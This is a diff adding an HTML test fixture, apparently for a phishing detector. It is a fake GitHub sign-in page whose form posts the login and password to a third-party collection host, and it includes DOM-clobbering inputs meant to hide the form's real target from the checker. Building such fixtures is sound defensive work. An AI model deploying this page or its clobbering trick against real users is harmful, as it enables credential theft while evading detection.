@@ -1,0 +1,15 @@
+<!doctype html>
+<!-- Theme F fixture: "GitHub login on github-login.app" — not a confusable of anything, so only the
+     sign-in-elsewhere rule catches it. The form also posts to a third site. Expected: danger. -->
+<html>
+  <head><title>GitHub</title></head>
+  <body>
+    <form action="https://collect.example.net/gh" method="post">
+      <input name="login" />
+      <!-- Clobbering attempts: a named input shadowing form.action / form.getAttribute. -->
+      <input name="action" type="hidden" value="/session" />
+      <input name="getAttribute" type="hidden" />
+      <input type="PASSWORD" name="password" />
+    </form>
+  </body>
+</html>
